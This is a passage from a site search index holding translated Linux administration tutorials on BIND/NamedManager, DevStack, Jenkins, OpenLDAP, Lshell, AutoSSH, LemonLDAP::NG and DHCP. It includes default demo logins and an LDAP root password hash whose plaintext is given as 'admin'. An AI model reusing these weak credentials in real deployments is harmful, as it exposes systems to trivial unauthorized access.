// API authentication key /* Log file to find messages from Named. Note that: * File should be in syslog format * Named Manager uses tail -f to read it, this can break with logrotate - make sure that either \"copytruncate\" mode is used, or tail processes are killed */ $config[\"log_file\"] = \"/var/log/syslog\"; /* Lock File Used to prevent clashes when multiple instances are accidently run. */ $config[\"lock_file\"] = \"/var/lock/namedmanager_lock\"; /* Bind Configuration Files Theses files define what files that NamedManager will write to. By design, NamedManager does not write directly into the master named configuration file, but instead into a seporate file that gets included - which allows custom configuration and zones to be easily added without worries of them being over written by NamedManager. */ $config[\"bind\"][\"version\"] = \"9\"; // version of bind (currently only 9 is supported, although others may work) $config[\"bind\"][\"reload\"] = \"/usr/sbin/rndc reload\"; // command to reload bind config \u0026 zonefiles $config[\"bind\"][\"config\"] = \"/etc/bind/named.namedmanager.conf\"; // configuration file to write bind config too $config[\"bind\"][\"zonefiledir\"] = \"/etc/bind/zones\"; // directory to write zonefiles too // note: if using chroot bind, will often be /var/named/chroot/var/named/ $config[\"bind\"][\"verify_zone\"] = \"/usr/sbin/named-checkzone\"; // Used to verify each generated zonefile as OK $config[\"bind\"][\"verify_config\"] = \"/usr/sbin/named-checkconf\"; // Used to verify generated NamedManager configuration // force debugging on for all users + scripts // (note: debugging can be enabled on a per-user basis by an admin via the web interface) //$_SESSION[\"user\"][\"debug\"] = \"on\"; ?\u003e Web Interface linkNow, you can access your server via https (mine is: https://dns.deimos.fr) with the following credentials:\nLogin: setup Password: setup123 Creating a User linkGo to “User Management”, create a new account and give it admin privileges, test it and delete the setup account or change its password. You should then see only your user:\nAPI Key linkGo to “Configuration” in the interface to set this key:\nSet your contact email address Enter the previously generated key Save the changes Finalization and Synchronization linkIt’s now time to add a DNS server from the graphical interface! Do it once by adding the API key etc…\nNow add a domain:\nand synchronize everything:\nphp -q /usr/share/namedmanager/bind/namedmanager_bind_configwriter.php info Run the command 5 times in a row, I encountered some issues the first time Everything should be working now :-), you can add records:\nFAQ linkWhy Don’t My Changes Work Even After Restarting Bind? linkCheck your logs! If you have messages like:\n\u003e tail -50 /var/log/syslog Apr 14 23:10:01 ZG001187 named[6340]: zone 0.168.192.in-addr.arpa/IN: loading from master file 0.168.192.in-addr.arpa.zone failed: file not found Apr 14 23:10:01 ZG001187 named[6340]: zone 0.168.192.in-addr.arpa/IN: not loaded due to errors. Apr 14 23:10:01 ZG001187 named[6340]: zone 255.in-addr.arpa/IN: loaded serial 1 Apr 14 23:10:01 ZG001187 named[6340]: zone deimos.fr/IN: loading from master file deimos.fr.zone failed: file not found Apr 14 23:10:01 ZG001187 named[6340]: zone deimos.fr/IN: not loaded due to errors. Check your configuration file generated by NamedManager. At the time of writing, I’ve submitted a patch and am waiting for integration, I found myself with this error:\n// // NamedManager Configuration // // This file is automatically generated any manual changes will be lost. // zone \"deimos.fr\" IN { type master; file \"deimos.fr.zone\"; allow-update { none; }; }; The complete path of the zone file is missing for it to work properly. To fix this issue, modify line 246 of this file:\nif ($this-\u003edomains) { foreach ($this-\u003edomains as $domain) { fwrite($fh, \"zone \\\"\". $domain[\"domain_name\"] .\"\\\\\" IN {\\n\"); fwrite($fh, \"\\ttype master;\\n\"); fwrite($fh, \"\\tfile \\\"\". $GLOBALS[\"config\"][\"bind\"][\"zonefiledir\"] . $domain[\"domain_name\"] .\".zone\\\";\\n\"); fwrite($fh, \"\\tallow-update { none; };\\n\"); fwrite($fh, \"};\\n\"); } } Then save your domains again through the interface (even without making changes) and run the command executed by cron:\nphp -q /usr/share/namedmanager/bind/namedmanager_bind_configwriter.php Now the file /etc/bind/named.namedmanager.conf contains the full path and you can restart bind with your zones properly loaded.\nReferences link https://projects.jethrocarr.com ↩︎\n"
            }
        );
    index.add(
            {
                id:  263 ,
                href: "\/DevStack_:_d%C3%A9velopper_ou_tester_rapidement_OpenStack\/",
                title: "DevStack: Quickly Develop or Test OpenStack",
                description: "Learn how to use DevStack to quickly set up and test OpenStack for development and testing purposes",
                content: " Software version Grizzly Operating System Ubuntu Server 12.04 Website DevStack Website Last Update 14/04/2013 Introduction linkIf you want to quickly test OpenStack1, whether for playing around or developing with it, DevStack2 is currently the fastest method.\nI started with an Ubuntu Server 12.04 base as this distribution is one of the versions recommended by DevStack. The goal here is to have a VM with all OpenStack services installed and functional.\nwarning WARNING: Do NOT use DevStack in production!!! Installation linkTo set up DevStack, we’ll need git:\naptitude install git git-core Now let’s get the current version of DevStack, and switch to the desired version (Grizzly):\ngit clone git://github.com/openstack-dev/devstack.git cd devstack git checkout stable/grizzly Then launch the installation and provide all requested passwords:\n./stack.sh Utilization linkTo launch a development stack:\n./stack.sh When the installation is complete, you can access the different services like this:\nHorizon: http://server/ Keystone: http://server:5000/v2.0/ The default users are admin and demo\nFor more information, check the GitHub3 page for DevStack.\nReferences link http://www.openstack.org/ ↩︎\nhttp://devstack.org/ ↩︎\nhttps://github.com/openstack-dev/devstack/tree/stable/grizzly ↩︎\n"
            }
        );
    index.add(
            {
                id:  264 ,
                href: "\/Jenkins_:_Mise_en_place_d%27un_outil_d%27int%C3%A9gration_continue\/",
                title: "Jenkins: Setting up a continuous integration tool",
                description: "Learn how to install and configure Jenkins, an open source continuous integration tool, with Nginx as a reverse proxy.",
                content: " Software version 1.447 Operating System Debian 7 Website Jenkins Last Update 12/04/2013 Introduction linkJenkins is an open source continuous integration tool, forked from the Hudson tool after disagreements between its author, Kohsuke Kawaguchi, and Oracle. Written in Java, Jenkins runs in a servlet container such as Apache Tomcat, or standalone with its own embedded web server.\nIt interfaces with version control systems such as CVS and Subversion, and executes projects based on Apache Ant and Apache Maven as well as arbitrary scripts in Unix shell or Windows batch.\nProject builds can be initiated in various ways, such as cron-like scheduling mechanisms, dependency systems between builds, or through requests to specific URLs.\nRecently, Jenkins has become a popular alternative to the reference tool CruiseControl.\nOn January 11, 2011, a proposal to rename Hudson was announced to avoid problems with a possible trademark registration of the name by Oracle. After failed negotiations with Oracle, a vote in favor of renaming was ratified on January 29, 2011.\nHere we’ll see how to set up a Jenkins server that will control a Selenium server for unit testing on a PHP application like Limesurvey.\nInstallation linkFor the installation part, it’s easy:\naptitude install jenkins nginx Note that we’re using an Nginx server as a frontend to forward requests to Jenkins and absorb the load of requests.\nConfiguration linkNginx linkFor Nginx, we will use the reverse proxy function to redirect the flow:\nupstream app_server { server 127.0.0.1:8080 fail_timeout=0; } server { listen 80; listen [::]:80 default ipv6only=on; server_name jenkins.deimos.fr; location / { proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header Host $http_host; proxy_redirect off; if (!-f $request_filename) { proxy_pass http://127.0.0.1:8080; break; } } } Adapt these lines according to your configuration.\nThen we activate this by default:\nrm -f /etc/nginx/sites-enabled/default ln -s /etc/nginx/sites-available/jenkins /etc/nginx/sites-enabled/ Then restart Nginx to access via http://jenkins-server\n"
            }
        );
    index.add(
            {
                id:  265 ,
                href: "\/LDAP_:_Installation_et_configuration_d\u0027un_Annuaire_LDAP\/",
                title: "LDAP: Installation and Configuration of an LDAP Directory",
                description: "A comprehensive guide to installing, configuring and managing an OpenLDAP directory with client configurations for various systems.",
                content: " Software version 2.4.23+ Operating System Debian 6 Website OpenLDAP Website Last Update 28/03/2013 Introduction linkLightweight Directory Access Protocol (LDAP) is a protocol that allows querying and modification of directory services. This protocol is based on TCP/IP. An LDAP directory typically follows the X.500 model defined by ITU-T: it is a tree structure where each node consists of attributes associated with their values.\nThe naming of the elements that make up the tree (root, branches, leaves) often reflects the political, geographical, or organizational model of the represented structure. The current trend is to use DNS naming for the basic elements of the directory (root and first branches). Deeper branches of the directory can represent people, organizational units, groups, etc.\ndc=fr | dc=example / \\ ou=people ou=groups Installation linkTo install OpenLDAP:\napt-get install ldap-server ldap-client This will install:\nldap-utils slapd libiodbc2 libldap-2.3-0 Configuration linkslapd.conf linkRecent Method linkHere is the recent method1 to configure your OpenLDAP (well… the beginning):\ndpkg-reconfigure -plow slapd Then follow the instructions.\nOld Method linkFirst, we need to generate an encrypted password because we will need to put it in the configuration file. We have the choice to put it in clear text as well, but for security reasons, it will be encrypted:\n# slappasswd New password: Re-enter new password: {SSHA}5y67xJ/t7esuGKUD7TQPcgykd8xiYMO2 Copy the last line {SSHA}5y67x… which corresponds to the encrypted password. Here the password is admin. Edit the file /etc/ldap/slapd.conf:\n# The following line allows the use of LDAP V2 standard allow bind_v2 # The following line gives the root of the LDAP base suffix \"dc=deimos,dc=fr\" # The following line that must be added manually gives the administrator login (admin with the reminder of the root). # This line and the next one are mandatory to have root access to the base from an external program (ex: PHP) rootdn \"cn=admin,dc=deimos,dc=fr\" # Paste the password we generated earlier: # Admin password for OpenLDAP rootpw {SSHA}5y67xJ/t7esuGKUD7TQPcgykd8xiYMO2 # Setting up write access to the database. You must indicate the correct login and the root of the database: access to attrs=userPassword,shadowLastChange by dn=\"cn=admin,dc=deimos,dc=fr\" write by anonymous auth by self write by * none # Setting up read-only access to the database. You must indicate the correct login and the root of the database: access to * by dn=\"cn=admin,dc=deimos,dc=fr\" write by * read Now, to apply the configuration, we will restart the server:\n/etc/init.d/slapd restart LDIF linkThis file format is used for imports/exports between multiple databases or to modify or add data to a database.\nWARNING: It is mandatory to encode the data in UTF-8. If an error is encountered during import, it is abandoned at the point where it occurred.\nImport a Schema linkHere is the structure of an LDIF file:\ndn: "
            }
        );
    index.add(
            {
                id:  266 ,
                href: "\/Lshell_:_limiter_les_possibilit%C3%A9s_du_shell\/",
                title: "Lshell: Limiting Shell Capabilities",
                description: "Learn how to restrict shell access and commands for users with Lshell on Linux systems. This guide covers installation, configuration, and integration with MySecureShell and sudo.",
                content: "Introduction linkLshell is a lightweight shell that allows restricting access to various commands and paths on your filesystems. It’s ideal for controlling what users can do on your machine.\nInstallation link aptitude install lshell Currently on Debian, it’s only available for the Squeeze version.\nConfiguration linkThe configuration is quite simple:\n# lshell.py configuration file # # $Id: lshell.conf,v 1.20 2009/06/09 19:53:46 ghantoos Exp $ [global] ## log directory (default /var/log/lshell/ ) logpath : /var/log/lshell/ ## set log level to 0, 1, 2 or 3 (0: no logs, 1: least verbose) loglevel : 2 ## configure log file name (default is %u i.e. username.log) #logfilename : %y%m%d-%u [default] ## Allowed commands allowed : ['ls','echo','cd','ll','vi'] ## Forbidden commands forbidden : [';', '\u0026', '|','`','\u003e','\u003c'] ## Limit of unauthorized command attempts before being kicked warning_counter: 2 ## Aliases aliases : {'ll':'ls -l', 'vi':'vim'} ## a value in seconds for the session timer #timer : 5 ## Authorized directories for users path : ['/home','/etc'] ## set the home folder of your user. If not specified the home_path is set to ## the $HOME environment variable #home_path : '/home/bla/' ## update the environment variable $PATH of the user #env_path : ':/usr/local/bin:/usr/sbin' ## allow or forbid the use of scp (set to 1 or 0) #scp : 1 ## allow of forbid the use of sftp (set to 1 or 0) #sftp : 1 ## list of command allowed to execute over ssh (e.g. rsync, rdiff-backup, etc.) #overssh : ['cd'] ## logging strictness. If set to 1, any unknown command is considered as ## forbidden, and user's warning counter is decreased. If set to 0, command is ## considered as unknown, and user is only warned (i.e. *** unknown synthax) #strict : 1 ## force files sent through scp to a specific directory #scpforce : '/home' As you can see, there are many useful options. However, today (at the time of writing), the options for the scp/sftp part are very limited. Fortunately, I have a solution.\nYou just need to assign this shell to the appropriate users (in /etc/passwd).\nForcing lshell at login linkIf you have a PAM authentication via LDAP, it’s possible to force a specific shell at login. This will override the information sent by NSS and replace it with the desired shell. Here we’ll use lshell for all people connecting via LDAP:\nnss_override_attribute_value loginShell /usr/bin/lshell Integration with MySecureShell linkMySecureShell will allow us to do all the configuration for the SFTP server, and in its configuration, we’ll make sure to add lshell for the users we’re interested in:\n... Shell /usr/bin/lshell ... And that’s it - we now have a configuration where both SFTP and shell access are perfectly controlled.\nIntegration with sudo linkIntegration with sudo will be essential for people wanting to use commands that can only be executed as root. You’ll need to modify the alias and allowed sections of lshell.\nDon’t forget to also modify the sudo configuration (otherwise watch out for security vulnerabilities) using the documentation available here.\nResources linkhttp://lshell.ghantoos.org/\n"
            }
        );
    index.add(
            {
                id:  267 ,
                href: "\/Awesome_:_un_bureau_l%C3%A9ger_et_puissant\/",
                title: "Awesome: A Lightweight and Powerful Desktop",
                description: "Learn how to install and configure Awesome, a lightweight and powerful tiling window manager for Linux.",
                content: " Software version 3.4.11 Operating System Debian 7 Website Website Last Update 28/03/2013 Introduction linkAwesome is a free window manager that runs on top of the X Window system on UNIX-type machines. Its goal is to remain very lightweight and offer several window layouts: maximized, floating, but also automatically placed in the form of tiles (a mode called tiling), similar to Ion.\nInstallation link aptitude install awesome Configuration linkThe configuration part is the most challenging aspect of Awesome. You can do really nice things provided you spend enough time on it.\nChecking your configuration linkFirst, let’s make sure we have our configuration file ~/.config/awesome/rc.lua. Every time you modify it, it’s wise to test your configuration before restarting awesome:\n\u003e awesome -k ~/.config/awesome/rc.lua ? Configuration file syntax OK. Testing your configuration linkIt’s very convenient to test your rc.lua configuration without having to break your own desktop1. A solution exists, which consists of launching a virtual desktop in your desktop. For this, we’ll use Xephyr:\naptitude install xserver-xephyr Then, we’ll initialize this virtual environment:\nXephyr :1 -ac -br -noreset -screen 1152x720 \u0026 and run our new awesome configuration (rc.lua.new):\nDISPLAY=:1.0 awesome -c ~/.config/awesome/rc.lua.new References link https://wiki.archlinux.org/index.php/Awesome#Debugging_rc.lua ↩︎\n"
            }
        );
    index.add(
            {
                id:  268 ,
                href: "\/Autossh_:_reconnecter_automatiquement_un_tunnel_SSH\/",
                title: "AutoSSH: Automatically Reconnect SSH Tunnels",
                description: "Learn how to use AutoSSH to maintain persistent SSH tunnels that automatically reconnect if the connection drops.",
                content: " Software version 1.4 Operating System Debian 7 Website AutoSSH Website Last Update 20/03/2013 Others Introduction linkIf like me you need to maintain a permanent tunnel, and you want it to automatically reconnect in case of disconnection, you need to use a tool like AutoSSH. I’ll skip the details of its complete operation, but you should know that it can work in 2 ways:\nBy establishing a loop with the remote server and regularly checking that data is flowing through it By querying a service on the remote machine at regular intervals Installation linkTo install it, it’s simple:\naptitude install autossh Configuration linkPersonally, I don’t use the method that regularly listens to a port; the other one is quite sufficient for me. So I’ll cover the basic method. Let’s imagine that I usually use an SSH connection by creating a socks and a local forward:\nssh -D12345 -N -f -L2222:10.0.0.1:22 deimos@server.deimos.fr To use it with autossh, it’s simple, just use all the SSH options and paste them after the autossh command:\nautossh -M 0 -D12345 -N -f -L2222:10.0.0.1:22 deimos@server.deimos.fr The -M 0 option allows you to not use the monitoring option (solution #1). And that’s it, autossh manages this connection for you.\nAt Boot linkIf you want to enable it at boot, here’s an example to add to rc.local:\n# /etc.rc.local autossh -M 0 -q -f -N -oServerAliveInterval=60 -oServerAliveCountMax=3 -L2222:10.0.0.1:22 deimos@server.deimos.fr The SSH options ServerAliveInterval and ServerAliveCountMax allow the connection to be cut if there’s a problem to force autossh to restart it.\nReferences linkhttps://www.harding.motd.ca/autossh/README\n"
            }
        );
    index.add(
            {
                id:  269 ,
                href: "\/LemonLDAP::NG_:_Plus_qu\u0027un_simple_SSO\/",
                title: "LemonLDAP::NG: More than just SSO",
                description: "A guide to LemonLDAP::NG, a comprehensive single sign-on solution with security features, authentication methods, and configuration options.",
                content: " Software version 1.2.3 Operating System Debian 7 Website LemonLDAP::NG Website Last Update 16/03/2013 Others Apache 2.2 Introduction linkLemonLDAP::NG was created by Éric German for the French Ministry of Finance. Initially named LevonLDAP, in tribute to Novell, it was designed to be compatible with Novell’s single sign-on (SSO) authentication system. It is based on the book “Writing Apache Modules with Perl and C The Apache API and mod_perl” by Doug MacEachern and Lincoln Stein (O’Reilly).\nIt was later renamed LemonLDAP::NG. From 2004, the project was gradually taken over by the French National Gendarmerie to become LemonLDAP::NG in 2005. Both projects coexisted for some time before LemonLDAP support was definitively abandoned.\nIt’s an SSO system with a unique identifier/password pair. SSO does not handle access control.\nSSO Modes link SSO by agent: installed on the client machine. No notion of security 1\nSSO by delegation: The user only needs their web browser. The server application points to the authentication portal 2\nReverse proxy: Authentication is handled through a reverse proxy 3\nHTTP Requests linkBefore diving into LemonLDAP, we need to understand how the HTTP protocol works. Let’s try to retrieve a website:\n\u003e telnet www.deimos.fr 80 Trying 88.190.51.112... Connected to shenzi.deimos.fr. Escape character is '^]'. GET / HTTP/1.1 301 Moved Permanently Server: nginx Content-Type: text/html; charset=UTF-8 X-Pingback: http://blog.deimos.fr/xmlrpc.php X-Powered-By: W3 Total Cache/0.9.2.8 Location: http://localhost/ Content-Length: 0 Accept-Ranges: bytes Date: Fri, 22 Feb 2013 18:40:10 GMT X-Varnish: 1562646426 Age: 0 Via: 1.1 varnish Connection: close Connection closed by foreign host. \u003e telnet www.deimos.fr 80 Trying 88.190.51.112... Connected to shenzi.deimos.fr. Escape character is '^]'. GET / HTTP/1.0 Host: www.deimos.fr 80 HTTP/1.1 200 OK Server: nginx Content-Type: text/html; charset=UTF-8 Vary: Accept-Encoding X-Pingback: http://blog.deimos.fr/xmlrpc.php X-Powered-By: W3 Total Cache/0.9.2.8 Link: ; rel=shortlink Date: Fri, 22 Feb 2013 18:40:02 GMT X-Varnish: 1562646424 1562646423 Age: 8 Via: 1.1 varnish Connection: close \u003c!DOCTYPE html\u003e Deimosfr Blog | Parce que la mémoire humaine ne fait pas des Go [...] Connection closed by foreign host. The return code is 200, everything is fine. You can check the list of HTTP return codes here: http://en.wikipedia.org/wiki/List_of_HTTP_status_codes\nCookies linkThe HTTP protocol is stateless. To maintain a persistent connection, we need to use HTTP 1.1 protocol. We also use cookies to store sessions. On the server side, the user session ID is stored. A cookie can be up to 4096 bytes maximum.\nThere are several types of cookies:\nSession cookies: The cookie will remain active for a defined time or until the browser is closed Persistent cookies: They remain active permanently A cookie exchange works like this:\nA simple request Server response with a “Set-cookie” header field Client request with a “Cookie” header field As a reminder, cookies are only valid on a single DNS domain.\nLemonLDAP linkThe Components linkLemonLDAP::NG uses 3 components:\nThe portal: authentication interface, application menu, password change The Handler: Apache module that controls access to web applications The Manager: the graphical part for configuring LemonLDAP Communication linkThe advantage compared to CAS is that the client does not need to go back through LemonLDAP::NG with each web service change.\nAuthentication Phases link 4\nWhen a user tries to access a protected application, their request is intercepted by the Handler If the SSO cookies are not detected, the Handler redirects the user to the portal The user authenticates on the portal The portal verifies their authentication If validated, the portal retrieves the user information The portal creates a session where it stores the user information The portal retrieves a session key The portal creates SSO cookies with session key/value The user is redirected to a protected application with their new cookie The Handler retrieves the cookie and session The Handler records user data in its cache The Handler checks access rights and sends headers to protected applications Protected applications send a response to the Handler The Handler sends a response to the user The Different Databases linkSeveral databases are used:\nAuthentication: how to validate authentication data Users: user data Password: where to change the user password Provider: how to provide identity to an external service For example, you can use Kerberos with LDAP.\nInternal databases:\nSessions: server-side session storage Configuration: configuration storage (versioned) Notifications Authentication Methods link LDAP Database SSL X509 Apache modules (Kerberos, OTP…) SAML 2.0 OpenID Twitter CAS Yubikey Radius Session Storage linkLemonLDAP::NG uses 3 levels of cache:\nApache::Session::*: final storage of sessions Cache:Cache*: allows the Handler to share data between Apache threads and processes Internal variables to LemonLDAP::NG::Handler: if the same user uses the same thread or process again. Installation linkNow for the practical part! You can either use the version available through the official repositories, or add the LemonLDAP::NG repository, which is what we’ll do here:\n# LemonLDAP::NG repository deb http://lemonldap-ng.org/deb squeeze main deb-src http://lemonldap-ng.org/deb squeeze main Then update:\naptitude install lemonldap-ng Let’s change the default configuration which is example.com:\nsed -i 's/example\\.com/deimos.fr/g' /etc/lemonldap-ng/* /var/lib/lemonldap-ng/conf/lmConf-1 /var/lib/lemonldap-ng/test/index.pl After this, you should not modify these configuration files manually!\nLet’s enable the sites and the Perl module for Apache:\na2ensite handler-apache2.conf a2ensite portal-apache2.conf a2ensite manager-apache2.conf a2ensite test-apache2.conf a2enmod perl Then restart Apache:\napache2ctl restart Configuration linkManager linkFor the manager to work:\necho \"127.0.0.1 reload.example.com\" \u003e\u003e /etc/hosts DNS Configuration linkFor DNS resolution to work correctly:\ncat /etc/lemonldap-ng/for_etc_hosts \u003e\u003e /etc/hosts Test Application linkThere are test1.example.com and test2.example.com to test your sites with username and password ‘dwho’: http://test1.example.com\nOther admin accounts that exist are:\nrtyler/rtyler msmith/msmith dwho/dwho This page will allow you to see important information that will be exchanged with LemonLDAP::NG. It’s useful for debugging in addition to Apache logs.\nProtection linkIn the file /etc/lemonldap-ng/lemonldap-ng.ini we can configure who has access to the manager!\n[...] # Manager protection: by default, the manager is protected by a demo account. # You can protect it : # * by Apache itself, # * by the parameter 'protection' which can take one of the following # values : # * authenticate : all authenticated users can access # * manager : manager is protected like other virtual hosts: you # have to set rules in the corresponding virtual host # * rule: : you can set here directly the rule to apply # * none : no protection protection = manager [...] By default, the protection is set to Manager, which is good. Only authorized people can connect to it (VirtualHost). It’s possible to use rules to specify something specific (a uid for example).\nAuthenticate allows any user who connects to have access to the manager. And the last option, none, is strongly discouraged as it allows anyone to access it.\nMacros linkMacros allow you to create variables in LemonLDAP. For example:\n$fullname =\u003e $givenname . '' . $surname You can then reuse $fullname.\nSessions linkBy default, every 10 minutes (via cron) there is a check for sessions that need to be purged: /etc/cron.d/liblemonldap-ng-portal-perl.\nHTTP Headers linkScript Parameters linkYou can modify GET requests to POST, for example.\nNotifications linkThey allow information to be validated by users and are stored in persistent sessions.\nFor example, you can create a disclaimer.\nCAS linkLemonLDAP::NG can handle CAS as either a client or server. CAS only performs URL redirections, with the possibility of proxy tickets.\nServer linkWhen acting as a CAS server, you need to enable rewrite rules:\na2enmod rewrite /etc/init.d/apache2 restart Client link aptitude install libauthcas-perl SAML linkHere are some terms to understand:\nIDP: Identity Provider CoT: Circle of Trust InterCoT: Circle of Trust between IDPs AA: Attribute Authority Proxy IDP: proxy for IDP to transfer identity requests SP: Service Provider To install LASSO (SAML), you need to install this:\naptitude install liblasso-perl References link http://www-igm.univ-mlv.fr/~dr/XPOSE2006/CLERET/techniques.html ↩︎\nhttp://www-igm.univ-mlv.fr/~dr/XPOSE2006/CLERET/techniques.html ↩︎\nhttp://www-igm.univ-mlv.fr/~dr/XPOSE2006/CLERET/techniques.html ↩︎\nhttp://lemonldap-ng.org/documentation/presentation ↩︎\n"
            }
        );
    index.add(
            {
                id:  270 ,
                href: "\/Configurer_le_r%C3%A9seau_sous_NetBSD\/",
                title: "Configure Network on NetBSD",
                description: "How to configure network interfaces, static IPs, and gateways on NetBSD",
                content: " Operating System 6.0.1 Website NetBSD Website Last Update 15/03/2013 Introduction linkThe network is an essential part of system configuration. I will cover some aspects of it here.\nConfiguration linkDisplay Interfaces and Associated IPs linkHere’s the command:\nifconfig Static IPs linkWe can declare interfaces persistently:\n[...] # Add local overrides below # ifconfig_vr0=\"inet 192.168.0.254 netmask 255.255.255.0\" # Wan ifconfig_vr1=\"inet 192.168.1.254 netmask 255.255.255.0\" # DMZ [...] You add an ifconfig entry with the interface name, followed by its parameters.\nGateway linkIt’s possible to set the gateway like this:\n[...] defaultroute=\"192.168.0.138\" [...] Or alternatively:\n192.168.0.138 Restart Network Services link /etc/rc.d/network restart "
            }
        );
    index.add(
            {
                id:  271 ,
                href: "\/DHCP_:_Installation_et_configuration_d\u0027un_serveur_DHCP\/",
                title: "DHCP: Installation and Configuration of a DHCP Server",
                description: "Guide to installing and configuring DHCP servers on various operating systems including Debian, FreeBSD, OpenBSD, NetBSD, and Red Hat.",
                content: "Introduction linkDynamic Host Configuration Protocol (DHCP) is a network protocol designed to automatically configure TCP/IP parameters for a station, particularly by automatically assigning an IP address and subnet mask. DHCP can also configure the default gateway address, DNS name servers, and NBNS name servers (known as WINS servers on Microsoft networks).\nThe initial design of Internet Protocol (IP) assumed pre-configuration of each computer connected to the network with the appropriate TCP/IP parameters - this is known as static addressing. On large or extended networks where changes occur frequently, static addressing creates a heavy maintenance burden and risks of errors. Additionally, assigned addresses cannot be used even when the computer that holds them is not in service. This is a typical problem for Internet Service Providers (ISPs), who generally have more customers than IP addresses available, but never have all customers connected simultaneously.\nDHCP offers solutions to these issues:\nOnly computers in service use an address from the address space Any parameter changes (gateway address, name servers) are applied to stations upon restart Modification of these parameters is centralized on DHCP servers The protocol was first presented in October 1993 and is defined by RFC1531, modified and supplemented by RFC 1534, RFC 2131, and RFC 2132.\nInstallation linkDebian linkFor installation, as usual, it’s quite simple:\naptitude install dhcp3-server OpenBSD linkOn OpenBSD, nothing to install, just activate it. Edit the rc.conf file and insert the interfaces that should provide DHCP:\ndhcpd_flags=\"sis1 vr0\" Then we’ll create the reservations file:\ntouch /var/db/dhcpd.leases FreeBSD linkLet’s install a DHCP server:\npkg_add -vr isc-dhcp41-server Then edit the rc.conf file to insert your default configuration with the interfaces on which the DHCP server will listen:\n# Network services dhcpd_enable=\"YES\" dhcpd_flags=\"-q\" dhcpd_conf=\"/usr/local/etc/dhcpd.conf\" dhcpd_ifaces=\"vr1 vr2\" dhcpd_chuser_enable=\"YES\" # runs w/o privileges? dhcpd_withuser=\"dhcpd\" # user name to run as dhcpd_withgroup=\"dhcpd\" # group name to run as dhcpd_chroot_enable=\"YES\" # runs chrooted? dhcpd_devfs_enable=\"YES\" # use devfs if available? dhcpd_rootdir=\"/var/db/dhcpd\" # directory to run in NetBSD linkOn NetBSD, the service already exists by default:\n# DHCPd Server dhcpd=YES dhcpd_flags=\"-q vr1 vr2\" Specify the interfaces on which you want them to run (vr1 and vr2 here).\nRed Hat linkTo install a DHCP server on Red Hat:\nyum install dhcp Before modifying the configuration, let’s copy a classic configuration:\ncp -f /usr/share/doc/dhcp-*/dhcpd.conf.sample /etc/dhcp/dhcpd.conf Configuration linkExample 1: Debian linkEdit the /etc/dhcp3/dhcpd.conf file on Debian:\n# dhcpd.conf # Sample configuration file for ISC dhcpd # option definitions common to all supported networks... # Server authority on the network authoritative; # Refuse duplicate MAC addresses. deny duplicates; # Ignore DHCPDECLINE messages from clients, helps prevent # successive address abandonment. ignore declines; # Various information is available to configure clients. # See man dhcp-options for the list. In our case these options # are the same for all our networks. # option lpr-servers 192.168.0.7; option netbios-name-servers 192.168.0.2; option smtp-server 192.168.0.1; # option pop-server 192.168.0.2; # Indicate the address of your network or subnet with its mask. # Parameters for the 192.168.0.0/240 network subnet 192.168.0.0 netmask 255.255.255.0 { ### DNS Options ### # Domain name for this zone. option domain-name \"deimos.fr\"; # Name or addresses of DNS for all our networks. option domain-name-servers 192.168.0.2, 212.27.32.176, 212.27.32.177; # DNS update method: ddns-update-style interim; # updates allowed ddns-updates on; # here, we force updates by the DHCP server ignore client-updates; # we also force updates for fixed IPs update-static-leases on; # Information about your network: option routers 192.168.0.138; option subnet-mask 255.255.255.0; option broadcast-address 192.168.0.255; # static routes that clients will retrieve option static-routes 172.16.0.0 192.168.0.138, 10.0.0.0 192.168.0.138; # Address ranges covered by DHCP. Range 192.168.0.15 192.168.0.50; default-lease-time 21600; max-lease-time 43200; ### Reservations ### # Computer1 host earth { hardware ethernet 24:13:D4:E9:15:56; fixed-address 192.168.0.3; option host-name \"earth\"; } # Computer2 host ordiminix { hardware ethernet 22:0c:6e:34:80:56; fixed-address 192.168.0.4; option host-name \"flower\"; } # include other configuration files include \"/etc/dhcp3/dhcpd.machintruc\"; include \"/etc/dhcp3/dhcpd.bidulechouette\"; } When you’re done, restart the service and everything will work:\n/etc/init.d/dhcp3-server restart Example 2: Red Hat linkEdit the /etc/dhcp/dhcpd.conf file to add the desired configuration. Here I have 2 declared ranges. Each range has its own interface:\n# dhcpd.conf # # Sample configuration file for ISC dhcpd # # option definitions common to all supported networks... option domain-name \"deimos.fr\"; option domain-name-servers ns1.deimos.fr, ns2.deimos.fr; default-lease-time 600; max-lease-time 7200; # Use this to enble / disable dynamic dns updates globally. ddns-update-style none; allow booting; allow bootp; # If this DHCP server is the official DHCP server for the local # network, the authoritative directive should be uncommented. authoritative; # Use this to send dhcp log messages to a different log file (you also # have to hack syslog.conf to complete the redirection). log-facility local7; # No service will be given on this subnet, but declaring it helps the # DHCP server to understand the network topology. subnet 10.102.2.32 netmask 255.255.255.224 { option routers 10.102.2.63; option subnet-mask 255.255.255.224; option domain-name-servers 192.168.0.69; range 10.102.2.33 10.102.2.62; next-server 10.102.2.1; filename \"pxelinux.0\"; } subnet 10.102.2.64 netmask 255.255.255.224 { option routers 10.102.2.65; option subnet-mask 255.255.255.224; option domain-name-servers 192.168.0.69; range 10.102.2.66 10.102.2.94; next-server 10.102.2.1; filename \"pxelinux.0\"; } # This is a very basic subnet declaration. #subnet 10.254.239.0 netmask 255.255.255.224 { # range 10.254.239.10 10.254.239.20; # option routers rtr-239-0-1.deimos.fr, rtr-239-0-2.deimos.fr; #} # This declaration allows BOOTP clients to get dynamic addresses, # which we don't really recommend. #subnet 10.254.239.32 netmask 255.255.255.224 { # range dynamic-bootp 10.254.239.40 10.254.239.60; # option broadcast-address 10.254.239.31; # option routers rtr-239-32-1.deimos.fr; #} # A slightly different configuration for an internal subnet. #subnet 10.5.5.0 netmask 255.255.255.224 { # range 10.5.5.26 10.5.5.30; # option domain-name-servers ns1.internal.deimos.fr; # option domain-name \"internal.deimos.fr\"; # option routers 10.5.5.1; # option broadcast-address 10.5.5.31; # default-lease-time 600; # max-lease-time 7200; #} # Hosts which require special configuration options can be listed in # host statements. If no address is specified, the address will be # allocated dynamically (if possible), but the host-specific information # will still come from the host declaration. #host passacaglia { # hardware ethernet 0:0:c0:5d:bd:95; # filename \"vmunix.passacaglia\"; # server-name \"toccata.fugue.com\"; #} # Fixed IP addresses can also be specified for hosts. These addresses # should not also be listed as being available for dynamic assignment. # Hosts for which fixed IP addresses have been specified can boot using # BOOTP or DHCP. Hosts for which no fixed address is specified can only # be booted with DHCP, unless there is an address range on the subnet # to which a BOOTP client is connected which has the dynamic-bootp flag # set. # You can declare a class of clients and then do address allocation # based on that. The example below shows a 